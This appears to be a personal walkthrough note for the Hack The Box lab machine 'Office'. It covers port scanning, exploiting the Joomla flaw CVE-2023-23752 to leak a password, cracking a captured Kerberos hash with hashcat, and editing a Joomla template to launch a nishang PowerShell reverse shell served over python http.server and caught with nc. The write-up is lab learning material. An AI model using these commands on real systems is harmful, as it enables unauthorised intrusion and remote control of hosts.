ip 10.10.11.3

# Enumeration:
### Nmap scan
nmap -p- -Pn --min-rate=5000 -vvv 10.10.11.3 
![[before/imgs/Pasted image 20240717221337.png]]

sudo nmap -p53,80,88,139,389,443,445,464,636,3268,3269,5985,9389 -A 10.10.11.3
![[before/imgs/Pasted image 20240717223654.png]]

from  http://office.htb/administrator/manifests/files/joomla.xml
jomla version  

searching for vulnerabilities in jomla version 4.2.7 found cve-2023-23752
searching for a exploit
found one in github

# CVE-2023-23752
![[before/imgs/Pasted image 20240718200848.png]]
a password found

![[before/imgs/Pasted image 20240718200722.png]]

![[before/imgs/Pasted image 20240718203352.png]]



![[before/imgs/Pasted image 20240718203235.png]]

![[before/imgs/Pasted image 20240718210231.png]]

wireshark
![[before/imgs/Pasted image 20240718210303.png]]
its using etype18 
so recreating the hash 
hash example  kerberos5 etype18 :


```

$krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb12e0266cde74e81094661addab08c0c1a178882c91a0ed89ae4e0e68d2820b9cce69770

```

using hascat 

![[before/imgs/Pasted image 20240718210003.png]]
new password found 
in templates 
![[before/imgs/Pasted image 20240718220256.png]]
edit offline.php 
then intercept with burpsuite
use nishang revsell 
 ```
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
edit shell.ps1
python3 -m http.server

```


![[before/imgs/Pasted image 20240718220230.png]]
nc -nlvp
![[before/imgs/Pasted image 20240718220418.png]]

and we r inside


[[HTB machines]]
